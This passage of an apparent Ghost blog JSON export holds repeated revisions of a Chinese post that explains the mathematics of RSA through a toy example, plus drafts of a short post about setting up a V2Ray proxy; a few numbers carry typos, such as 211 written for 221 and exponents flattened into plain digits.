`扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388632259,"created_at":"2019-09-13 15:30:32"},{"id":"5d7bb6633faccd0001d052dc","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n\\n好了，真正巧妙的就在这里了: \\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388707322,"created_at":"2019-09-13 15:31:47"},{"id":"5d7bb6e33faccd0001d052de","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n```\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n```\\n\\n好了，真正巧妙的就在这里了: \\n\\n```\\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n```\\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n\\n```\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n```\\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n```\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n```\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}],[\"markdown\",{\"markdown\":\"看到网上有些人质疑`Matrix67`的数学能力, 我想引用某网友的评论表达我的观点\\n\\n![Screen-Shot-2019-09-13-at-4.44.23-PM](/content/images/2019/09/Screen-Shot-2019-09-13-at-4.44.23-PM.png)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[1,\"p\",[]]]}","created_at_ts":1568388835047,"created_at":"2019-09-13 15:33:55"},{"id":"5d871d6c3faccd0001d052e7","post_id":"5d871d6c3faccd0001d052e5","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","created_at_ts":1569135980806,"created_at":"2019-09-22 07:06:20"},{"id":"5d87276e3faccd0001d05339","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\"}],[\"markdown\",{\"markdown\":\"速度上差强人意\"}],[\"image\",{\"src\":\"/content/images/2019/09/v2ray.png\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[1,\"p\",[]]]}","created_at_ts":1569138542797,"created_at":"2019-09-22 07:49:02"},{"id":"5d87298d3faccd0001d0533b","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\"}],[\"markdown\",{\"markdown\":\"速度上差强人意, 正常搜索\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[1,\"p\",[]]]}","created_at_ts":1569139085348,"created_at":"2019-09-22 07:58:05"},{"id":"5d8729dc3faccd0001d0533d","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139164962,"created_at":"2019-09-22 07:59:24"},{"id":"5d8729ef3faccd0001d0533f","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度可以接受, \"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139183327,"created_at":"2019-09-22 07:59:43"},{"id":"5d872a0a3faccd0001d05341","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度可以接受, Google查个资料, YouTube看个\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139210695,"created_at":"2019-09-22 